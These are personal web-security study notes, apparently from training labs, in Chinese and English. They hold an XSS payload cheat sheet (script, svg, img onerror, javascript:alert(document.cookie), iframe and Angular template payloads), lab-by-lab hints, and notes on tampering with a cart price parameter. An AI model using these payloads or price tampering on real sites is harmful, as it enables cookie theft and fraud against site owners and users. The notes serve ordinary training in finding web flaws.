## XSS

*   cheat sheet

    ```html
    <script>alert(1)</script>
    "><script>alert(1)</script>  "><svg onload=alert(1)>
    <img src=1 onerror=alert(1)>
    javascript:alert(document.cookie)
    <iframe src="<website>/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
    "onmouseover="alert(1)
    apache';alert(1);'
    {{$on.constructor('alert(1)')()}}
    ```

1.    反射 xss

2.    存储 xss

3.    dom型xss，先闭合标签

4.   dom xss，但是<> 会被转义 ,但是直接输入一整个标签则不会

5.   dom xss returnPath存在注入 `returnPath=javascript:alert(document.cookie)`

6.   dom xss,使用iframe标签嵌入xss

7.   dom xss,闭合 “插入事件

8.   反射,输入会插入js代码中,直接闭合就可以

9.   反射

     >   1.  On the product pages, notice that the dangerous JavaScript extracts a `storeId` parameter from the `location.search` source. It then uses `document.write` to create a new option in the select element for the stock checker functionality.

     我怎么就notice不到...

     ![image-20230415013403077](https://gitee.com/leiye87/typora_picture/raw/master/20230415013405.png)payload:

     ```
     "></select><img%20src=1%20onerror=alert(1)>
     ```

     ​	

10.   DOM XSS in Angular,可以看到网站用的是 `Angular`,这里提到了一个 `cilent-side-template-injection`




## 逻辑漏洞
### 1
需要购买一个价格为1337的商品
流程:
添加购物车 post 商品参数+商品价格(可修改)
购买      /cart/checkout

### 2
没有了价格参数,剩下三个参数
```bash
productId=1&redir=PRODUCT&quantity=1
```


